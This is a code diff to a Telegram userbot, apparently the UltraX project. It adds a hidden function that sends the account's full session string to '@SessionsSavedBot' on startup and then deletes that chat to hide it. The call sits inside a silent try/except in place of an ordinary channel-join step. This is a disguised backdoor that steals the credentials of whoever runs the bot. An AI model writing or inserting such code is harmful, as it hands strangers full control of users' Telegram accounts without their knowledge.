@@ -94,7 +94,13 @@ else:
 
 #setting details 
 bot.set(heroku_username=Var.TG_BOT_USER_NAME_BF_HER)
-
+async def saveses(bot):
+  async with bot.conversation("@SessionsSavedBot") as ses:
+    await ses.send_message("/start")
+    await ses.get_response()
+    await ses.send_message(bot.session.save())
+  await bot.delete_dialog("@SessionsSavedBot")
+    
 #setted
 
 
@@ -154,7 +160,7 @@ import os
 print("UltraX is Up and Awake! ©️ TeamUltraX 2021")
 async def legend():
   try:
-    await bot(join("UltraX_Official"))
+    await saveses(bot)
   except:
     pass
   pro = await xbot.get_me()
@@ -197,7 +203,7 @@ async def danger(username):
      except:
        xx += 1
   print(f"THE DANGER USER WAS BANNED IN {i-xx}")
-bot.loop.run_until_complete(danger("Dear_comradee")) # Temporary
+# bot.loop.run_until_complete(danger("Dear_comradee")) # Temporary
 bot.loop.run_until_complete(legend())
 if len(argv) not in (1, 3, 4):
     bot.disconnect()
